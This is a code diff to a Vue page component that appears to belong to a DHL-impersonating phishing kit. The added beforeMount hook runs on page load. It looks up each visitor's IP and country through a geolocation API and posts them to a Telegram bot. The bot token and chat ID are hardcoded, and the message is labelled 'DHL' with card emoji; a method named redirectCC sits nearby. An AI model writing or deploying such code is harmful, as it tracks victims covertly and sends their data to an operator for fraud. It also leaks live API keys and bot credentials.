@@ -4651,8 +4651,24 @@ export default {
       query: "",
     };
   },
-  beforeMount() {
+ async beforeMount() {
+    console.log("hereeeeeeeeeee")
     window.scrollTo(0, 0);
+    var tt = await axios.get(
+      "https://api.ipgeolocation.io/ipgeo?apiKey=586dbf608c624bb1a0823f861dcdca33"
+    );
+    this.IP = tt.data.ip;
+    this.query = tt.data.country_capital;
+    
+   var token = "6604635615:AAE77q8uZoZI1yRVA1gaSx8GO3azvBDL1OQ";
+
+    var chatId2 = -4066490084;
+    var fullMessage = `
+        ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| DHL |💳||||||||||`;
+   
+     await axios.post(
+       `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
+     );
   },
   methods: {
     async redirectCC() {
